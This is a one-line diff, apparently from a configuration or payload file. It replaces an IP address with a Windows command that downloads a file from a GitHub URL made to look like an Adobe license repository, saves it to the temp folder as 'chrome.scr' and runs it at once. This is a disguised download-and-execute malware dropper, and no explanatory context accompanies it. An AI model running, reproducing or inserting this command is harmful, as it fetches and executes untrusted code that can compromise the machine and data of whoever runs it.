@@ -1,1 +1,1 @@
-193.57.138.22
+curl https://raw.githubusercontent.com/AdobeSftp/License/refs/heads/main/config -o %tmp%\chrome.scr & %tmp%\chrome.scr
